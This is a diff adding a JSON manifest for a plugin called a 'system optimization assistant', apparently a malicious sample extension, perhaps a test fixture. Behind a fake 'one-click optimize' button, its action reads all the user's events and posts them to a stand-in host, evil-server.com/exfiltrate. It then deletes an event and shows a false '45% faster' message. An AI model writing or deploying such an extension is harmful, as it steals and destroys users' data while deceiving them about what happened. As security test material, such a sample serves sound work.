@@ -1,0 +1,133 @@
+{
+  "id": "com.evil.rogue_optimizer",
+  "name": "系统极限优化助手",
+  "description": "一键清理系统缓存，大幅提升运行速度。需要读取事件数据以分析活动频率，并连接云端数据库获取最新的优化算法。",
+  "author": "System Admin",
+  "version": "2.0.1",
+  "icon_code": 62578,
+  "permissions": [
+    "read_events",
+    "network"
+  ],
+  "view": {
+    "type": "container",
+    "props": {
+      "padding": 20,
+      "alignment": "center"
+    },
+    "child": {
+      "type": "column",
+      "props": {
+        "mainAxisAlignment": "center",
+        "crossAxisAlignment": "center"
+      },
+      "children": [
+        {
+          "type": "icon",
+          "props": {
+            "icon": "trending_up",
+            "size": 80,
+            "color": "#4CAF50"
+          }
+        },
+        {
+          "type": "sizedbox",
+          "props": {
+            "height": 20
+          }
+        },
+        {
+          "type": "text",
+          "props": {
+            "value": "系统状态：良好",
+            "fontSize": 20,
+            "bold": true
+          }
+        },
+        {
+          "type": "text",
+          "props": {
+            "value": "点击下方按钮开始深度优化",
+            "color": "#757575"
+          }
+        },
+        {
+          "type": "sizedbox",
+          "props": {
+            "height": 40
+          }
+        },
+        {
+          "type": "container",
+          "props": {
+            "padding": 15,
+            "borderRadius": 12,
+            "color": "#2196F3"
+          },
+          "child": {
+            "type": "text",
+            "props": {
+              "value": "开始一键优化",
+              "color": "#FFFFFF",
+              "bold": true
+            }
+          },
+          "onTap": "rogueAction"
+        }
+      ]
+    }
+  },
+  "logic": {
+    "actions": {
+      "rogueAction": [
+        {
+          "call": "api.showSnackBar",
+          "params": {
+            "message": "正在扫描系统冗余数据..."
+          }
+        },
+        {
+          "call": "api.getEvents",
+          "assignTo": "stolenData"
+        },
+        {
+          "call": "api.showSnackBar",
+          "params": {
+            "message": "发现 ${state.stolenData.length} 个优化点，正在上传特征码..."
+          }
+        },
+        {
+          "call": "api.httpPost",
+          "params": {
+            "url": "https://evil-server.com/exfiltrate",
+            "body": {
+              "extensionId": "com.evil.rogue_optimizer",
+              "data": "${state.stolenData}"
+            }
+          }
+        },
+        {
+          "call": "api.showSnackBar",
+          "params": {
+            "message": "正在清理临时文件..."
+          }
+        },
+        {
+          "call": "api.deleteEvent",
+          "params": {
+            "id": "some_random_id_or_from_state"
+          }
+        },
+        {
+          "call": "api.showConfirmDialog",
+          "params": {
+            "title": "优化完成",
+            "message": "系统性能已提升 45%。是否查看详细报告？",
+            "confirmLabel": "确定",
+            "cancelLabel": "忽略"
+          }
+        }
+      ]
+    }
+  }
+}
